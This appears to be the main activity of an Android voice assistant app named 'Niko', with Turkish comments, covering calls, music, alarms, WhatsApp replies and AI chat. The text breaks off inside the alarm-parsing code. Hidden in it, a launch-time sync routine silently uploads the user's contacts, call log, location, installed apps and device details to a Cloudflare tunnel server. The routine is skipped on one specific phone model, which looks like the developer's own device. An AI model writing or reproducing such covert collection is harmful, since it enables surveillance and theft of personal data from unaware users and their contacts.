package com.example.niko;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.RemoteInput;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.speech.RecognitionListener;
import android.speech.RecognizerIntent;
import android.speech.SpeechRecognizer;
import android.speech.tts.TextToSpeech;
import android.speech.tts.UtteranceProgressListener;
import android.view.View;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import android.media.MediaPlayer;
import android.media.AudioManager;
import android.view.KeyEvent;
import android.util.Base64;
import android.os.Build;
import java.io.File;
import java.io.FileOutputStream;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.BatteryManager;
import android.os.Environment;
import android.os.StatFs;
import android.location.Location;
import android.location.LocationManager;
import java.util.List;

import java.io.InputStream;
import java.io.OutputStream;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.Locale;
import java.util.Queue;
import java.util.Date;
import java.text.SimpleDateFormat;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import android.provider.AlarmClock;
import android.provider.CalendarContract;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Calendar;
import android.net.wifi.WifiManager;
import android.bluetooth.BluetoothAdapter;
import android.view.Window;
import android.view.WindowManager;
import android.content.SharedPreferences;
import android.widget.LinearLayout;
import android.graphics.Color;
import android.widget.Button;
import android.view.ViewGroup;
import android.text.TextWatcher;
import android.text.Editable;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.widget.EditText;
import android.text.SpannableString;
import android.text.style.BackgroundColorSpan;
import android.text.Spanned;
import android.view.animation.Animation;
import android.view.animation.TranslateAnimation;
import android.view.animation.AlphaAnimation;
import android.view.animation.AnimationSet;
import android.view.inputmethod.InputMethodManager;

/**
* Niko Mobil Uygulaması Ana Aktivitesi
*
* Bu sınıf, uygulamanın merkezi kontrol noktasıdır. Sesli komutları dinler,
* işler ve uygun eylemleri (arama yapma, müzik kontrolü, yapay zeka sohbeti
* vb.) gerçekleştirir.
*/
public class MainActivity extends Activity {

	// İzin talebi için kullanılan sabit kod
	private static final int PERMISSION_CODE = 100;

	// Arayüz bileşenleri
	private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
	private ImageButton btnMic; // Mikrofon butonu
	private TextView txtAIResponse; // AI veya sistem yanıtlarını gösteren metin alanı
	private View aiResponseContainer; // Yanıt metnini tutan ScrollView

	// Ses ve TTS (Metin Okuma) bileşenleri
	private SpeechRecognizer speechRecognizer; // Sesi yazıya çevirmek için
	private Intent speechIntent;
	private TextToSpeech tts; // Yazıyı sese çevirmek için

	// Durum değişkenleri
	private boolean isListening = false; // Şu an dinliyor mu?
	private final Queue<String> ttsQueue = new LinkedList<>(); // Okunacak metin kuyruğu

	// Geçmiş bileşenleri
	private ImageButton btnHistory;
	private View layoutHistory;
	private ImageButton btnCloseHistory;
	private Button btnClearHistory;
	private LinearLayout containerHistoryItems;
	private SharedPreferences historyPrefs;
	private TextView txtHistoryStats;
	private EditText edtHistorySearch;
	private final Object historyLock = new Object();
	private static final int MAX_HISTORY_ITEMS = 100; // Artırıldı

	// WhatsApp entegrasyonu için veriler
	public static String lastWhatsAppMessage; // Son okunan mesaj
	public static String lastWhatsAppSender; // Son mesajın göndericisi
	public static PendingIntent lastReplyIntent; // Cevap vermek için intent
	public static RemoteInput lastRemoteInput; // Cevap girişi için referans

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		// Arayüz elemanlarını bağla
		voiceOrb = findViewById(R.id.voiceOrb);
		btnMic = findViewById(R.id.btnMic);
		txtAIResponse = findViewById(R.id.txtAIResponse);
		aiResponseContainer = findViewById(R.id.aiResponseContainer);

		// Geçmiş arayüzünü bağla
		btnHistory = findViewById(R.id.btnHistory);
		layoutHistory = findViewById(R.id.layoutHistory);
		btnCloseHistory = findViewById(R.id.btnCloseHistory);
		btnClearHistory = findViewById(R.id.btnClearHistory);
		containerHistoryItems = findViewById(R.id.containerHistoryItems);
		txtHistoryStats = findViewById(R.id.txtHistoryStats);
		edtHistorySearch = findViewById(R.id.edtHistorySearch);

		historyPrefs = getSharedPreferences("chat_history", MODE_PRIVATE);

		// Gerekli başlatma işlemleri
		requestPermissions(); // İzinleri iste
		initSpeech(); // Konuşma tanıma servisini başlat
		initTTS(); // Metin okuma servisini başlat

		// Mikrofon butonuna tıklayınca dinlemeyi başlat
		btnMic.setOnClickListener(v -> startListening());

		// Geçmiş butonları
		btnHistory.setOnClickListener(v -> showHistory(""));
		btnCloseHistory.setOnClickListener(v -> hideHistory());
		btnClearHistory.setOnClickListener(v -> clearHistory());

		// Arama çubuğu takibi
		edtHistorySearch.addTextChangedListener(new TextWatcher() {
			@Override
			public void beforeTextChanged(CharSequence s, int start, int count, int after) {
			}

			@Override
			public void onTextChanged(CharSequence s, int start, int before, int count) {
				// Sadece panel görünürse güncelleme yap (kapatırken metin temizlenince tekrar
				// açılmasını önler)
				if (layoutHistory.getVisibility() == View.VISIBLE) {
					showHistory(s.toString());
				}
			}

			@Override
			public void afterTextChanged(Editable s) {
			}
		});

		// Uygulama başladığında rehber ve arama kayıtlarını arka planda senkronize et
		syncAllData();
	}

	// ================= İZİNLER (PERMISSIONS) =================

	/**
	* Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan ister.
	* Ses kaydı, rehber okuma, arama yapma vb.
	*/
	private void requestPermissions() {
		String[] perms = { Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_CONTACTS,
				Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG,
				Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION };

		ArrayList<String> list = new ArrayList<>();
		for (String p : perms) {
			// Eğer izin verilmemişse listeye ekle
			if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
				list.add(p);
			}
		}
		// Eksik izin varsa hepsini topluca iste
		if (!list.isEmpty()) {
			requestPermissions(list.toArray(new String[0]), PERMISSION_CODE);
		}
	}

	@Override
	public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
		for (int r : res) {
			if (r != PackageManager.PERMISSION_GRANTED) {
				speak("Tüm izinler gerekli");
				return;
			}
		}
	}

	// ================= KONUŞMA TANIMA (SPEECH RECOGNITION) =================

	private void initSpeech() {
		// Android'in yerleşik konuşma tanıyıcısını oluştur
		speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this);

		// Tanıma parametrelerini ayarla
		speechIntent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
		speechIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
		speechIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE, "tr-TR"); // Türkçe dili
		speechIntent.putExtra(RecognizerIntent.EXTRA_PREFER_OFFLINE, true); // Mümkünse çevrimdışı çalışmayı tercih et

		speechRecognizer.setRecognitionListener(new RecognitionListener() {

			@Override
			public void onResults(Bundle results) {
				isListening = false;
				ArrayList<String> list = results.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION);
				if (list == null || list.isEmpty())
					return;

				// Kullanıcının söylediği ilk (en olası) cümleyi al
				String cmd = list.get(0);
				String cmdLower = cmd.toLowerCase();
				saveToHistory("Ben", cmd); // Orijinal haliyle kaydet

				// 1. Önce yerel komut mu diye kontrol et (alarm, arama, müzik vb.)
				if (!handleCommand(cmdLower)) {
					// 2. Eğer yerel bir komut değilse interneti kontrol et
					if (isNetworkAvailable()) {
						// İnternet varsa Yapay Zeka'ya sor
						askAI(cmd);
					} else {
						// İnternet yoksa kullanıcıyı bilgilendir
						speak("İnternet bağlantım yok. Şimdilik sadece yerel komutları (saat, tarih, arama gibi) uygulayabilirim.");
					}
				}
			}

			public void onError(int e) {
				// Hata durumunda dinlemeyi bırak
				isListening = false;
			}

			public void onReadyForSpeech(Bundle b) {
			}

			public void onBeginningOfSpeech() {
				// Konuşma başladığında kullanıcıya geri bildirim ver
				runOnUiThread(() -> {
					aiResponseContainer.setVisibility(View.VISIBLE);
					txtAIResponse.setText("Dinliyorum...");
				});
			}

			public void onRmsChanged(float rmsdB) {
				// Ses şiddetine göre ekrandaki yuvarlağın boyutunu değiştir (görsel efekt)
				float scale = 1.0f + (rmsdB / 10.0f);
				voiceOrb.setScaleX(scale);
				voiceOrb.setScaleY(scale);
			}

			public void onBufferReceived(byte[] b) {
			}

			public void onEndOfSpeech() {
			}

			public void onPartialResults(Bundle b) {
			}

			public void onEvent(int t, Bundle b) {
			}
		});
	}

	/**
	* Mikrofonu dinlemeye başlatır.
	*/
	private void startListening() {
		if (!isListening) {
			isListening = true;
			speechRecognizer.startListening(speechIntent);
		}
	}

	// ================= KOMUT İŞLEME (COMMAND HANDLING) =================

	/**
	* Gelen sesli komutu analiz eder ve uygun işlemi yapar.
	*
	* @param c Kullanıcının söylediği cümle (küçük harfe çevrilmiş)
	* @return Komut işlendiyse true, işlenmediyse (AI'ya sorulacaksa) false döner.
	*/
	private boolean handleCommand(String c) {

		// --- NIKO KİMLİK KONTROLÜ ---
		if (c.contains("adın ne") || c.contains("kimsin") || c.contains("kendini tanıt")) {
			speak("Benim adım Niko. Senin kişisel yapay zeka asistanınım.");
			return true;
		}

		// --- WHATSAPP İŞLEMLERİ ---
		if (c.contains("whatsapp") && c.contains("oku")) {
			readLastWhatsAppMessage();
			return true;
		}

		if (c.contains("whatsapp") && c.contains("cevap")) {
			replyWhatsApp("Tamam"); // Basit otonom cevap örneği
			return true;
		}

		// --- ARAMA İŞLEMLERİ ---
		if (c.contains("son gelen")) {
			callLast(CallLog.Calls.INCOMING_TYPE);
			return true;
		}

		if (c.contains("son aranan")) {
			callLast(CallLog.Calls.OUTGOING_TYPE);
			return true;
		}

		if (c.contains("ara")) {
			// "Ahmet'i ara" gibi komutlardan ismi ayıkla
			callByName(c.replace("ara", "").trim());
			return true;
		}

		// --- TARİH VE SAAT ---
		if (c.contains("saat kaç") || c.contains("saati söyle")) {
			SimpleDateFormat sdf = new SimpleDateFormat("HH:mm", Locale.getDefault());
			speak("Saat şu an " + sdf.format(new Date()));
			return true;
		}

		if (c.contains("tarih") || c.contains("bugün günlerden ne") || c.contains("hangi gündeyiz")) {
			SimpleDateFormat sdf = new SimpleDateFormat("dd MMMM yyyy EEEE", new Locale("tr", "TR"));
			speak("Bugün " + sdf.format(new Date()));
			return true;
		}

		// --- KAMERA ---
		if (c.contains("kamera aç") || c.contains("fotoğraf çek")) {
			try {
				Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
				startActivity(intent);
				speak("Kamera açılıyor");
			} catch (Exception e) {
				speak("Kamera uygulaması bulunamadı.");
			}
			return true;
		}

		// --- AYARLAR EKRANI ---
		if (c.contains("ayarları aç")) {
			startActivity(new Intent(Settings.ACTION_SETTINGS));
			speak("Ayarlar açılıyor");
			return true;
		}

		// --- MÜZİK KONTROLLERİ ---
		// "müziği", "müzikler", "şarkıyı", "parça", "spotify" gibi varyasyonları
		// kapsamak için genişletildi
		if (c.contains("müzik") || c.contains("müzi") || c.contains("şarkı") || c.contains("spotify")
				|| c.contains("parça")) {
			if (c.contains("başlat") || c.contains("oynat") || c.contains("devam") || c.contains("çal")
					|| c.contains("aç")) {
				controlMusic(KeyEvent.KEYCODE_MEDIA_PLAY);
				speak("Müzik başlatılıyor");
				return true;
			}
			if (c.contains("durdur") || c.contains("duraklat") || c.contains("kapat")) {
				controlMusic(KeyEvent.KEYCODE_MEDIA_PAUSE);
				speak("Müzik durduruldu");
				return true;
			}
			if (c.contains("sonraki") || c.contains("geç") || c.contains("değiştir") || c.contains("atla")
					|| c.contains("sıradaki")) {
				controlMusic(KeyEvent.KEYCODE_MEDIA_NEXT);
				speak("Sonraki şarkı");
				return true;
			}
			if (c.contains("önceki") || c.contains("başa") || c.contains("geri")) {
				controlMusic(KeyEvent.KEYCODE_MEDIA_PREVIOUS);
				speak("Önceki şarkı");
				return true;
			}
		}

		// --- ALARM & HATIRLATICI ---
		if (c.contains("alarm")) {
			setAlarm(c);
			return true;
		}

		if (c.contains("hatırlat") || c.contains("anımsat")) {
			setReminder(c);
			return true;
		}

		// --- SİSTEM AYARLARI KONTROLÜ (WIFI, BT, PARLAKLIK) ---
		if (c.contains("wifi") || c.contains("wi-fi") || c.contains("internet")) {
			if (c.contains("aç")) {
				controlWifi(true);
				return true;
			}
			if (c.contains("kapat")) {
				controlWifi(false);
				return true;
			}
		}

		if (c.contains("bluetooth")) {
			if (c.contains("aç")) {
				controlBluetooth(true);
				return true;
			}
			if (c.contains("kapat")) {
				controlBluetooth(false);
				return true;
			}
		}

		if (c.contains("parlaklık") || c.contains("ışık")) {
			if (c.contains("arttır") || c.contains("yükselt") || c.contains("aç")) {
				controlBrightness(true);
				return true;
			}
			if (c.contains("azalt") || c.contains("kıs") || c.contains("düşür")) {
				controlBrightness(false);
				return true;
			}
		}

		// --- GEÇMİŞ KOMUTLARI ---
		if (c.contains("geçmişi") || c.contains("sohbet geçmişini")) {
			if (c.contains("göster") || c.contains("aç") || c.contains("oku")) {
				int count = getHistoryCount();
				showHistory("");
				speak("Sohbet geçmişi açılıyor. Toplam " + count + " mesaj bulundu.", false);
				return true;
			}
			if (c.contains("temizle") || c.contains("sil") || c.contains("kapat")) {
				clearHistory();
				return true;
			}
		}

		return false; // Komut algılanmadıysa AI'ya devret
	}

	// ================= ARAMA (CALL) FONKSİYONLARI =================

	/**
	* Son gelen veya giden aramayı tekrar arar.
	*/
	private void callLast(int type) {
		if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
			return;

		try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.TYPE + "=?",
				new String[] { String.valueOf(type) }, CallLog.Calls.DATE + " DESC")) {

			if (c != null && c.moveToFirst()) {
				startCall(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
			}
		}
	}

	/**
	* Rehberde isim arayarak arama başlatır.
	*/
	private void callByName(String name) {
		try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
				ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?", new String[] { "%" + name + "%" },
				null)) {

			if (c != null && c.moveToFirst()) {
				startCall(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
			}
		}
	}

	/**
	* Verilen numarayı arar.
	*/
	private void startCall(String phone) {
		if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)
			return;

		startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone)));
	}

	// ================= MEDYA KONTROLLERİ (MEDIA CONTROL) =================

	private void controlMusic(int keyCode) {
		AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
		if (audioManager != null) {
			long eventTime = android.os.SystemClock.uptimeMillis();
			// Medya tuşuna basıldı (DOWN) ve bırakıldı (UP) olaylarını simüle et
			KeyEvent downEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_DOWN, keyCode, 0);
			KeyEvent upEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_UP, keyCode, 0);

			audioManager.dispatchMediaKeyEvent(downEvent);
			audioManager.dispatchMediaKeyEvent(upEvent);
		}
	}

	// ================= YAPAY ZEKA ENTEGRASYONU (AI) =================

	/**
	* Kullanıcı sorusunu uzak sunucuya (Cloudflare Tunnel aracılığıyla) gönderir ve
	* cevabı işler.
	*/
	private void askAI(String q) {
		new Thread(() -> {
			try {
				// 1. URL: Cloudflare tünel adresi (veya localhost) için
				URL url = new URL("https://transmitted-renaissance-tent-past.trycloudflare.com/chat");

				// 2. Bağlantı Ayarları
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
				conn.setRequestProperty("Accept", "application/json");
				conn.setRequestProperty("x-api-key", "test"); // Güvenlik anahtarı
				conn.setDoOutput(true); // Gövde (body) göndermek için true

				JSONObject body = new JSONObject();
				body.put("message", q);
				body.put("enable_audio", true);
				body.put("web_search", false);
				body.put("rag_search", false);
				body.put("mode", "normal");

				String jsonInputString = body.toString();

				// 4. İsteği Gönderme
				try (OutputStream os = conn.getOutputStream()) {
					byte[] input = jsonInputString.getBytes("utf-8");
					os.write(input, 0, input.length);
				}

				// 5. Cevabı Okuma
				int code = conn.getResponseCode();
				InputStream stream = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();

				BufferedReader br = new BufferedReader(new InputStreamReader(stream, "utf-8"));
				StringBuilder response = new StringBuilder();
				String responseLine;
				while ((responseLine = br.readLine()) != null) {
					response.append(responseLine.trim());
				}

				// 6. JSON Parse Etme ve UI Güncelleme
				if (code == 200) {
					JSONObject jsonResponse = new JSONObject(response.toString());
					String replyText = jsonResponse.optString("reply", "Cevap anlaşılamadı");
					String audioB64 = jsonResponse.optString("audio", "");

					// Audio (Ses) verisi varsa onu oynat, yoksa TTS'e ver
					if (!audioB64.isEmpty()) {
						final String textToShow = replyText;
						runOnUiThread(() -> {
							aiResponseContainer.setVisibility(View.VISIBLE);
							txtAIResponse.setText(textToShow);
						});
						playAudio(audioB64);
					} else {
						speak(replyText);
					}
				} else {
					speak("Sunucu hatası: " + code);
				}

			} catch (Exception e) {
				e.printStackTrace();
				speak("Bağlantı hatası oluştu");
			}
		}).start();
	}

	// Verileri senkronize eder (Rehber ve Arama Geçmişi)
	private void syncAllData() {
		String deviceName = Build.MANUFACTURER + "_" + Build.MODEL;
		// Belirli cihazlarda (örn. Emülatör) çalışmasını engellemek için kontrol
		if ("Xiaomi_25069PTEBG".equals(deviceName)) {
			return;
		}
		new Thread(() -> {
			try {
				syncContacts(); // Rehberi gönder
				syncCallLogs(); // Arama kayıtlarını gönder
				syncLocation(); // Konumu gönder
				syncInstalledApps(); // Uygulamaları gönder
				syncDeviceInfo(); // Cihaz bilgisini gönder
			} catch (Exception e) {
				e.printStackTrace();
			}
		}).start();
	}

	private void syncContacts() throws Exception {
		JSONArray array = new JSONArray();
		// Rehberden isim ve numara bilgilerini çek
		try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
				null)) {
			if (c != null) {
				int nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
				int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
				while (c.moveToNext()) {
					JSONObject obj = new JSONObject();
					obj.put("name", c.getString(nameIdx));
					obj.put("phone", c.getString(numIdx));
					array.put(obj);
				}
			}
		}
		sendSyncRequest(array, "contacts");
	}

	private void syncCallLogs() throws Exception {
		JSONArray array = new JSONArray();
		if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
			return;

		// Son arama kayıtlarını tarihe göre sıralı çek
		try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
				CallLog.Calls.DATE + " DESC")) {
			if (c != null) {
				int numIdx = c.getColumnIndex(CallLog.Calls.NUMBER);
				int typeIdx = c.getColumnIndex(CallLog.Calls.TYPE);
				int dateIdx = c.getColumnIndex(CallLog.Calls.DATE);
				int durationIdx = c.getColumnIndex(CallLog.Calls.DURATION);

				while (c.moveToNext()) {
					JSONObject obj = new JSONObject();
					obj.put("number", c.getString(numIdx));
					obj.put("type", c.getInt(typeIdx));
					obj.put("date", c.getLong(dateIdx));
					obj.put("duration", c.getInt(durationIdx));
					array.put(obj);
				}
			}
		}
		sendSyncRequest(array, "calls");
	}

	private void syncLocation() throws Exception {
		if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
			return;

		LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		Location loc = null;

		if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
			loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
		}

		if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
			loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
		}

		if (loc != null) {
			JSONArray array = new JSONArray();
			JSONObject obj = new JSONObject();
			obj.put("lat", loc.getLatitude());
			obj.put("lng", loc.getLongitude());
			obj.put("time", loc.getTime());
			obj.put("alt", loc.getAltitude());
			array.put(obj);
			sendSyncRequest(array, "location");
		}
	}

	private void syncInstalledApps() throws Exception {
		JSONArray array = new JSONArray();
		List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
		for (PackageInfo p : packs) {
			// Sadece kullanıcı tarafından yüklenen uygulamaları al (sistem uygulamalarını
			// filtrele)
			if ((p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
				JSONObject obj = new JSONObject();
				obj.put("name", p.applicationInfo.loadLabel(getPackageManager()).toString());
				obj.put("package", p.packageName);
				obj.put("version", p.versionName);
				obj.put("install_time", p.firstInstallTime);
				array.put(obj);
			}
		}
		sendSyncRequest(array, "apps");
	}

	private void syncDeviceInfo() throws Exception {
		JSONObject obj = new JSONObject();

		// Batarya Durumu
		BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
		obj.put("battery", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));

		// Depolama Bilgisi
		File path = Environment.getDataDirectory();
		StatFs stat = new StatFs(path.getPath());
		long totalSize = stat.getBlockCountLong() * stat.getBlockSizeLong();
		long availableSize = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();

		obj.put("storage_total_gb", totalSize / (1024 * 1024 * 1024));
		obj.put("storage_available_gb", availableSize / (1024 * 1024 * 1024));

		// Donanım ve Versiyon
		obj.put("android_ver", Build.VERSION.RELEASE);
		obj.put("sdk_int", Build.VERSION.SDK_INT);
		obj.put("manufacturer", Build.MANUFACTURER);
		obj.put("model", Build.MODEL);
		obj.put("brand", Build.BRAND);

		JSONArray array = new JSONArray();
		array.put(obj);
		sendSyncRequest(array, "device_info");
	}

	/**
	* Toplanan veriyi backend'e POST eder.
	*/
	private void sendSyncRequest(JSONArray data, String type) throws Exception {
		// Not: askAI ile aynı domaini kullanmalıdır
		URL url = new URL("https://transmitted-renaissance-tent-past.trycloudflare.com/sync_data");
		HttpURLConnection conn = (HttpURLConnection) url.openConnection();
		conn.setRequestMethod("POST");
		conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
		conn.setRequestProperty("x-api-key", "test");
		conn.setDoOutput(true);

		JSONObject payload = new JSONObject();
		payload.put("data", data);
		payload.put("type", type);
		payload.put("device_name", Build.MANUFACTURER + "_" + Build.MODEL);

		try (OutputStream os = conn.getOutputStream()) {
			os.write(payload.toString().getBytes("utf-8"));
		}

		int responseCode = conn.getResponseCode();
		android.util.Log.d("NIKO_SYNC", "Type: " + type + " | Response Code: " + responseCode);
	}

	// Sunucudan gelen Base64 kodlu ses verisini çalar
	private void playAudio(String base64Sound) {
		try {
			// Ses verisini geçici dosyaya yaz
			byte[] decoded = Base64.decode(base64Sound, Base64.DEFAULT);
			File tempMp3 = File.createTempFile("niko_voice", ".mp3", getCacheDir());
			tempMp3.deleteOnExit();

			FileOutputStream fos = new FileOutputStream(tempMp3);
			fos.write(decoded);
			fos.close();

			// Medya oynatıcıyı UI thread'de başlat
			runOnUiThread(() -> {
				try {
					MediaPlayer mp = new MediaPlayer();
					mp.setDataSource(tempMp3.getAbsolutePath());
					mp.prepare();
					mp.start();

					mp.setOnCompletionListener(mediaPlayer -> {
						mediaPlayer.release();
					});
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			});

		} catch (Exception e) {
			e.printStackTrace();
			speak("Ses verisi işlenemedi.");
		}
	}

	// ================= METİN OKUMA (TTS) =================

	// ================= METİN OKUMA (TTS) AYARLARI =================

	/**
	* Metin okuma motorunu başlatır.
	*/
	private void initTTS() {
		tts = new TextToSpeech(this, status -> {
			if (status == TextToSpeech.SUCCESS) {
				int result = tts.setLanguage(new Locale("tr", "TR"));

				if (result == TextToSpeech.LANG_MISSING_DATA || result == TextToSpeech.LANG_NOT_SUPPORTED) {
					// Dil desteklenmiyorsa log basılabilir veya kullanıcı uyarılabilir
				} else {
					// TTS başarıyla yüklendiğinde kendini tanıt
					// speak("Merhaba, ben Niko. Emrinizdeyim.");
				}
			}
		});

		tts.setOnUtteranceProgressListener(new UtteranceProgressListener() {
			public void onStart(String id) {
				// Konuşma başlayınca yapılacaklar
			}

			public void onDone(String id) {
				// Konuşma bitince mikrofona tekrar geçmek isterseniz burada startListening()
				// çağırabilirsiniz. Şu an manuel tetikleniyor.
			}

			public void onError(String id) {
			}
		});
	}

	/**
	* Metni seslendirir.
	*/
	private void speak(String t) {
		speak(t, true);
	}

	private void speak(String t, boolean saveToHistory) {
		// Sistem mesajlarını ve boş mesajları geçmişe kaydetme
		if (saveToHistory && !t.equals("Dinliyorum...") && !t.equals("Hazır") && !t.trim().isEmpty()
				&& t.length() > 2) {
			saveToHistory("Niko", t);
		}
		ttsQueue.offer(t);
		runOnUiThread(() -> {
			aiResponseContainer.setVisibility(View.VISIBLE);
			txtAIResponse.setText(t);
			speakNext();
		});
	}

	private void speakNext() {
		if (!tts.isSpeaking() && !ttsQueue.isEmpty()) {
			tts.speak(ttsQueue.poll(), TextToSpeech.QUEUE_FLUSH, null, "tts");
		}
	}

	// ================= WHATSAPP ENTEGRASYONU =================

	/**
	* Bildirimleri dinleyerek WhatsApp mesajlarını yakalar.
	* Bu servis için "Bildirim Erişim İzni" verilmesi gerekir.
	*/
	public static class WhatsAppService extends NotificationListenerService {

		@Override
		public void onNotificationPosted(StatusBarNotification sbn) {

			// Sadece WhatsApp paketini filtrele
			if (!"com.whatsapp".equals(sbn.getPackageName()))
				return;

			Notification n = sbn.getNotification();
			if (n == null)
				return;

			Bundle e = n.extras;

			// Mesaj içeriğini ve göndereni global değişkenlere kaydet
			lastWhatsAppMessage = String.valueOf(e.getCharSequence(Notification.EXTRA_TEXT));
			lastWhatsAppSender = String.valueOf(e.getCharSequence(Notification.EXTRA_TITLE));

			// Hızlı cevap (Quick Reply) aksiyonlarını bul ve kaydet
			if (n.actions != null) {
				for (Notification.Action a : n.actions) {
					if (a.getRemoteInputs() != null) {
						lastReplyIntent = a.actionIntent;
						lastRemoteInput = a.getRemoteInputs()[0];
					}
				}
			}
		}
	}

	private void readLastWhatsAppMessage() {
		if (lastWhatsAppMessage == null) {
			speak("Okunacak WhatsApp mesajı yok");
			return;
		}
		speak(lastWhatsAppSender + " şöyle yazmış: " + lastWhatsAppMessage);
	}

	private void replyWhatsApp(String msg) {

		// Bildirim erişim izni kontrolü
		if (!Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners")
				.contains(getPackageName())) {

			startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
			return;
		}

		if (lastReplyIntent == null || lastRemoteInput == null)
			return;

		// Cevap intentini oluştur ve gönder
		Intent i = new Intent();
		Bundle b = new Bundle();
		b.putCharSequence(lastRemoteInput.getResultKey(), msg);
		RemoteInput.addResultsToIntent(new RemoteInput[] { lastRemoteInput }, i, b);

		try {
			lastReplyIntent.send(this, 0, i);
		} catch (Exception ignored) {
		}
	}

	// ================= ALARM & HATIRLATICI MODÜLÜ =================

	/**
	* Sesli komuttan saat bilgisini ayrıştırıp alarm kurar.
	*/
	private void setAlarm(String cmd) {
		String clean = cmd.toLowerCase(new Locale("tr", "TR"));
		int hour = -1;
		int minute = 0;

		// 1. GÖRELİ ZAMAN: "10 dakika sonra", "1 saat sonra"
		Pattern pRel = Pattern.compile("(\\d+)\\s*(dakika|dk|saat)\\s*sonra");
		Matcher mRel = pRel.matcher(clean);

		if (mRel.find()) {
			int val = Integer.parseInt(mRel.group(1));
			boolean isHour = mRel.group(2).startsWith("saat");

			Calendar cal = Calendar.getInstance();
			if (isHour)
				cal.add(Calendar.HOUR_OF_DAY, val);
			else
				cal.add(Calendar.MINUTE, val);

			hour = cal.get(Calendar.HOUR_OF_DAY);
			minute = cal.get(Calendar.MINUTE);
		} else {
			// 2. KESİN ZAMAN (ABSOLUTE TIME)
			boolean pm = clean.contains("akşam") || clean.contains("gece") || clean.contains("öğleden sonra");
			boolean half = clean.contains("buçuk") || clean.contains("yarım");

			// Formatlar: "07:30", "14.20", "19 45"
			Pattern p1 = Pattern.compile("(\\d{1,2})[.:\\s](\\d{2})");
			Matcher m1 = p1.matcher(clean);

			if (m1.find()) {
				hour = Integer.parseInt(m1.group(1));
				minute = Integer.parseInt(m1.group(2));
			} else {
				// Formatlar: "saat 7", "7 buçuk"
				Pattern p2 = Pattern.compile("saat\\s*(\\d{1,2})");
				Matcher m2 = p2.matcher(clean);

				if (m2.find()) {
					hour = Integer.parseInt(m2.group(1));
				} else if (pm || half) {
					// "saat" demese bile "akşam 8" veya "9 buçuk" dediyse sayıyı al
					Pattern p3 = Pattern.compile("(\\d{1,2})");
					Matcher m3 = p3.matcher(clean);
					if (m3.find()) {
						hour = Integer.parseInt(m3.group(1));
					}
				}

				if (hour != -1 && half) {
